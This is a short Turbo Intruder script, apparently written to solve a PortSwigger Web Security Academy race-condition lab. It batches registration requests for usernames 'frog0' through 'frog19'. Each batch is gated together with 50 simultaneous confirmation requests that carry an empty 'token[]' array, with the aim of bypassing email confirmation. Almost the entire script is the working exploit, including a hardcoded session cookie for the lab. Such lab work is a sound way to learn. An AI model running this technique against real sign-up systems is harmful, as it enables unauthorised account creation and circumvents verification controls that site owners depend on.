def queueRequests(target, wordlists):

    engine = RequestEngine(endpoint=target.endpoint,
                            concurrentConnections=1,
                            engine=Engine.BURP2
                            )
    
    token_req = '''POST /confirm?token[]= HTTP/2
Host: 0aa400630352a7a7804c44420040003a.web-security-academy.net
Cookie: phpsessionid=yPvtc5Q1o41RYihUGBETOIrqSeZLrLK2
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 0
Origin: https://0aa400630352a7a7804c44420040003a.web-security-academy.net
Referer: https://0aa400630352a7a7804c44420040003a.web-security-academy.net/confirm
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers
'''


    for i in range(20):
        username = "frog" + str(i)        
        engine.queue(target.req, username, gate=str(i))
        
        for confirm in range(50):
            engine.queue(token_req, gate=str(i))
            
         
        engine.openGate(str(i))

def handleResponse(req, interesting):
    table.add(req)
